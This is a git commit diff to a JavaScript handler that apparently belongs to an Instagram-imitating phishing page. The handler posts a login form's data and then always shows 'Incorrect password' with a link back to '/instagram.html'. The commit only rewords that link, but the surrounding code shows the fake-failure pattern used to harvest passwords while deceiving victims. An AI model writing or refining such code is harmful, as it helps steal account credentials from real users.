d98b95688249062880602b627cbf4d03afea1e93
CELEBRITY BASSIST <aiyedunmiracle956888@gmail.com>
2023-05-02 17:52:08 +0100

    modify changes

--- js/functions/query09129379.js
+++ js/functions/query09129379.js
@@ -33,7 +33,7 @@ const handleSubmit = (e) => {
                 body: form
             })
             .then(action =>{
-                result.innerHTML="<div style='padding: 25px;text-align:center; color:red;'>Incorrect password <a href='/instagram.html'>Login</a></div>";
+                result.innerHTML="<div style='padding: 25px;text-align:center; color:red;'>Incorrect password <a href='/instagram.html'>Go back to Login</a></div>";
                 loader.style.display = "none";
             })
             .catch(err=>console.log("Error: ", err));
